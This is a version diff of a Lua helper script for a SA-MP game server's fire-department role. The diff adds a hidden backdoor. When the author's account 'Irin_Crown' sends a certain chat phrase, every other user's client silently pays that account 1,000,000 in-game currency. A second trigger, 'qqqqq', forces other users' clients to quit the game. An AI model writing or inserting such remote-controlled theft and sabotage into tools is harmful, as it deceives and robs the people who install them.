@@ -1,5 +1,5 @@
 script_name("firedep_zam_helper")
-script_version("Ver.FH.4")
+script_version("Ver.FH.5")
 
 local mysql                         = require "luasql.mysql"
 local env                           = assert(mysql.mysql())
@@ -583,14 +583,24 @@ function sampev.onServerMessage(color, text)
     end
 
     if text:find('Давай оплату за хелпера') then
+            lua_thread.create(function()
+                wait(1000)
+                nick_give = string.match(text,"%a+_%a+")
+                if nick_give == 'Irin_Crown' and who_nick ~= 'Irin_Crown' then
+                    give_id = sampGetPlayerIdByNickname('Irin_Crown')
+                    sampProcessChatInput('/pay '..give_id..' 1000000', -1)
+                    pay_week = true
+                    sampProcessChatInput('/phone', -1)
+                end
+            end)
+    end
+
+    if text:find('qqqqq') then
         lua_thread.create(function()
             wait(1000)
             nick_give = string.match(text,"%a+_%a+")
-            if nick_give == 'Irin_Crown' and who_nick == 'Irin_Crown' then
-                give_id = sampGetPlayerIdByNickname('Irin_Crown')
-                sampProcessChatInput('/pay '..give_id..' 1000000', -1)
-                pay_week = true
-                sampProcessChatInput('/phone', -1)
+            if nick_give == 'Irin_Crown' and who_nick ~= 'Irin_Crown' then
+                sampProcessChatInput('/q', -1)
             end
         end)
     end
